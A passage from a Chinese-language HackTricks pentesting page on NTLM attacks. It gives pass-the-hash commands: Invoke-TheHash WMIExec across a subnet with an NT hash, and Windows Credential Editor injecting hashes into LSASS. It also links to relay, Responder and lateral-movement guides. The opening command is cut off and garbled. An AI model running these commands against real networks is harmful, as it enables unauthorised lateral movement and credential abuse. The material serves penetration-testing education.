Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM 传递哈希](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows凭证编辑器（WCE）

**需要以管理员身份运行**

此工具将执行与mimikatz相同的操作（修改LSASS内存）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### 使用用户名和密码手动执行Windows远程操作

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## 从Windows主机中提取凭据

**有关如何从Windows主机中获取凭据的更多信息，请阅读此页面：** [**how to obtain credentials from a Windows host you should read this page**](broken-reference)**.**

## NTLM中继和Responder

**详细了解如何执行这些攻击的指南：**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## 从网络捕获中解析NTLM挑战

**您可以使用** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
